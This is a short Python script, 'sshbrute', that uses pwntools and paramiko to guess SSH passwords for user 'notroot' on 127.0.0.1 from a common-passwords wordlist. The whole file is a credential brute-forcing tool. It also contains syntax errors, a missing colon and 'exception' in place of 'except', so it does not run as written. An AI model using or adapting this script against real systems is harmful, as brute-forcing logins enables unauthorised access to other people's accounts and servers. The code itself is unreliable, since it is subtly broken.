#!/bin/python3
# sshbrute
# Meistsec 10/2022

from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("ssh-commmon-passwords.txt", "r") as passwords_list
	for password in passwords_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		exception paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1